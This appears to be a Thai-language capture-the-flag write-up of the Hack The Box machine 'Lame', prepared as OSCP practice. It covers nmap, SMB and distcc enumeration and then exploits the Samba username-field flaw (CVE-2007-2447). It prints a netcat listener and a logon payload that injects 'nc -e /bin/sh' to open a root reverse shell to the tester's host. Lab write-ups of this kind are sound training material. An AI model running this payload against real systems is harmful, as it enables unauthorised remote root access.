layout: secret_post
title:  "Test Encrypt"
date:   2019-01-01 00:00:00
key: "my_secret_key"

# [](#header-1)Info card
![](https://gblobscdn.gitbook.com/assets%2F-MHuMmzGhYGjfRNXyWFK%2F-MHvl49IgHnk-WKCt0u6%2F-MHvlnxDfRBJsqRVouf_%2Fimage.png?alt=media&token=992ad801-c46c-4ffb-9e02-1a2cab97283a)

# [](#header-1)Enumeration
```
nmap -sC -sV -Pn -oA  nmap/Lame_fullscan 10.10.10.3
```

## [](#header-2)Nmap scan result
```
Nmap scan report for 10.10.10.3
Host is up (0.030s latency).
Not shown: 996 filtered ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.6
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
|_smb-security-mode: ERROR: Script execution failed (use -d to debug)
|_smb2-time: Protocol negotiation failed (SMB2)
```

### Por lists:
*   <b>Port 21</b> : เป็น FTP protocol โดยจากในผลการแสกน Nmap เราจะเห็นได้ว่าเป็น version  vsftpd 2.3.4 โดยเราจะเห็นว่ามันสามารถเข้าสู่ระบบแบบ anonymous ได้
*   <b>Port 22</b> : เป็น secure shell โดยมี version เป็น OpenSSH 4.7p1
*   <b>Port 139</b> กับ 445 : เป็น SMB Protocol เอาไว้สำหรับแชร์ไฟล์ต่างๆโดย

## [](#header-2)UDP Enumeration scan
```
nmap -sU -O -p- -oA nmap/udp 10.10.10.3
```

Nmap UDP scan result:
```
Nmap scan report for 10.10.10.3
Host is up (0.028s latency).
Not shown: 65531 open|filtered ports
PORT     STATE  SERVICE
22/udp   closed ssh
139/udp  closed netbios-ssn
445/udp  closed microsoft-ds
3632/udp closed distcc
Too many fingerprints match this host to give specific OS details
Network Distance: 2 hops
```

## [](#header-2)FTP (Port 21) Enumeration
```
ls /usr/share/nmap/scripts/ftp*
```

![](https://gblobscdn.gitbook.com/assets%2F-MHuMmzGhYGjfRNXyWFK%2F-MHuOCv8G7qwMc-cC8z-%2F-MHubWdy9-hoopvsWogz%2Fimage.png?alt=media&token=adf076b2-212c-4d2c-b9a8-b1e7504f11ec)

หลังจากนั้นลองรันคำสั่งไปที่ Port 21 ดูเพื่อเช็คว่ามันมีช่องโหว่หรือไม่

```
nmap --script ftp-vsftpd-backdoor -p 21 10.10.10.3
```

![](https://gblobscdn.gitbook.com/assets%2F-MHuMmzGhYGjfRNXyWFK%2F-MHuOCv8G7qwMc-cC8z-%2F-MHuc6Zl1Cxxj5SXtv9K%2Fimage.png?alt=media&token=6331cc41-6f29-49ef-bd3c-8bf7727b4da0)

จากผลของ Nmap สรุปคือไม่มี ช่องโหว่ทำไรต่อไม่ได้แล้วงั้นเราจะไปดูกันที่ Protocol อื่นกันต่อ

## [](#header-2)SSH (Port 22) Enumeration
```
ls /usr/share/nmap/scripts/ssh*
```

## [](#header-2)SMB (Port 139, 445) Enumeration

เราจะใช้ SMB client ในการเข้าถึง SMB Server โดยเราจะใช้คำสั่งด้านล่างดังต่อไปนี้
```
smbclient -L 10.10.10.3
```

* <b>-L</b> : แสดงบริการที่มีอยู่บนเซิฟเวอร์ 

แต่หลังจากที่ลองรันไปก็พข้อความ Error 
```
protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED
```

วิธีแก้คือไปแก้ไข config ใน <b>smb.conf</b>
```
sudo gedit /etc/samba/smb.conf
```

หลังจากนั้นให้เราเพิ่ม  client max protocol = NT1  กับ client min protocol = NT1 เข้าไปในส่วน [global]

![](https://gblobscdn.gitbook.com/assets%2F-MHuMmzGhYGjfRNXyWFK%2F-MHutFwjHjtxX-Z_RUir%2F-MHuw_VCFpGa87iXaJ6c%2Fimage.png?alt=media&token=ffaba264-f49a-4467-874f-95edd4951625)

หรืออาจจะใช้คำสั่งนี้แทนก็ได้ 

```
smbclient -L //10.10.10.3/ --option='client min protocol=NT1'
```
จากนั้นผลลัพธ์ที่ได้จะออกมาลักษณะนี้

![](https://gblobscdn.gitbook.com/assets%2F-MHuMmzGhYGjfRNXyWFK%2F-MHutFwjHjtxX-Z_RUir%2F-MHuxEorqxMaV-NDsEIg%2Fimage.png?alt=media&token=5c34c0a6-ff4e-485e-96be-90f620822eab)

เราสามารถตรวจสอบ permission ของเราได้โดยใช้คำสั่งนี้ 
```
smbmap -H 10.10.10.3
```

ผลลัพธ์ที่ได้
```
[+] Finding open SMB ports....
[+] User SMB session established on 10.10.10.3...
[+] IP: 10.10.10.3:445  Name: 10.10.10.3                                        
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        tmp                                                     READ, WRITE     oh noes!
        opt                                                     NO ACCESS
        IPC$                                                    NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$                                                  NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
```

จะเห็นว่าในโฟลเดอร์ tmp เรามีสิทธิ์ที่จะ READ กับ WRITE ได้

## [](#header-2)distcc v1 (Port 3632) Enumeration
```
nmap --script distcc-cve2004-2687 -p 3632 10.10.10.3
```

Nmap scan result:
```
Nmap scan report for 10.10.10.3
Host is up (0.029s latency).

PORT     STATE SERVICE
3632/tcp open  distccd
| distcc-cve2004-2687: 
|   VULNERABLE:
|   distcc Daemon Command Execution
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2004-2687
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|       Allows executing of arbitrary commands on systems running distccd 3.1 and
|       earlier. The vulnerability is the consequence of weak service configuration.
|       
|     Disclosure date: 2002-02-01
|     Extra information:
|       
|     uid=1(daemon) gid=1(daemon) groups=1(daemon)
|   
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687
|       https://distcc.github.io/security.html
|_      https://nvd.nist.gov/vuln/detail/CVE-2004-2687
```

# [](#header-1)Exploitation

## [](#header-2)Method 1 SMB using username field vuln

โดยหลังจากลองค้นหาข้อมูลดูก็พบว่ามันมีช่องโหว่จาก [CVE-2007-2447](https://www.cvedetails.com/cve/CVE-2007-2447/) ซึ่งแน่นอนว่ามันมี Metasploit module อยู่แต่ถ้าเป็นการสอบ OSCP เราจะสามารถใช้ Metasploit ได้แค่ครั้งเดียวในการสอบเท่านั้นเพราะอย่างนั้นจึงควรหลีกเลี่ยงการใช้ให้มากที่สุดเท่าที่จะทำได้

ในส่วนของ PoC ของช่องโหว่นี้หากเราลองดูจาก source code
![](https://gblobscdn.gitbook.com/assets%2F-MHuMmzGhYGjfRNXyWFK%2F-MHutFwjHjtxX-Z_RUir%2F-MHvBNRsWgIb0dqmGkfY%2Fimage.png?alt=media&token=8202355a-ddd9-47ca-8da9-10ac1b1f58ea)

จะเห็นว่าช่องโหว่นี้เกิดจาก username มีการรับ metacharacter ซึ่งในการที่รับ input เข้ามานั้นหมายความว่าเราสามารถป้อนอินพุตอะไรก็ได้ (arbitary commands) โดยมันจะทำการรันคำสั่งอะไรก็ได้ที่ผู้ใช้ป้อนเข้าไปโดยเราจะใช้ประโยชน์จากจุดนี้ในการทำ <b>reverse shell</b>

## [](#header-2)Reverse shell using nc
เราจะทำการเปิด port 4444 ในเครื่องของเราให้มันรอรับการเชื่อมต่อ จากเครื่องเป้าหมายโดยใช้คำสั่งนี้
```
nc -nlvp 4444
```

หลังจากนั้นเราจะใช้ smbclient เพื่อเชื่อมต่อไปที่โฟลเดอร์ <b>tmp</b> เพราะเรามีสิทธิในการ READ,WRITE ได้โดยใช้

### [](#header-3)Login to SMB client
```
smbclient //10.10.10.3/tmp
```

หลังจากที่เราเข้ามาแล้วมาแล้วตรงส่วนของ password เราไม่ต้องกรอกอะไร enter ได้เลยเพราะเนื่องจากเราเข้าใช้งานในฐานะของ <b>anonymous user</b>
![](https://gblobscdn.gitbook.com/assets%2F-MHuMmzGhYGjfRNXyWFK%2F-MHutFwjHjtxX-Z_RUir%2F-MHvSnuNYZoEUguZ6Leu%2Fimage.png?alt=media&token=eda01e16-d903-42c0-bcea-c88fc752dfc1)

## [](#header-2)Got Root
หลังจากนั้นเราจะเอา payload ที่ได้จาก PoC ด้านบนมาใช้เพื่อ excute command ให้มัน reverse shell มาที่เครื่องของเราโดยใช้คำสั่ง

```
logon "/=`nohup nc -nv 10.10.14.6 4444 -e /bin/sh`"
```
![](https://gblobscdn.gitbook.com/assets%2F-MHuMmzGhYGjfRNXyWFK%2F-MHutFwjHjtxX-Z_RUir%2F-MHvT9MKtBevt2RJT3ce%2Fimage.png?alt=media&token=df715f08-5261-4bb6-bd8a-9059b8c786ad)

หลังจากนั้นกลับมาดูที่ nc ที่เราเปิด port เอาไว้เราจะเห็นว่ามีการเชื่อมต่อเข้ามาจากเครื่องของเป้าหมายเรียบร้อยแล้วด้วยสิทธิ์ของ <b>root</b>
![](https://gblobscdn.gitbook.com/assets%2F-MHuMmzGhYGjfRNXyWFK%2F-MHutFwjHjtxX-Z_RUir%2F-MHvU1MqwpM2leeAgjOi%2Fimage.png?alt=media&token=51d9d02d-06bb-4ac5-99fa-005c0d878c94)
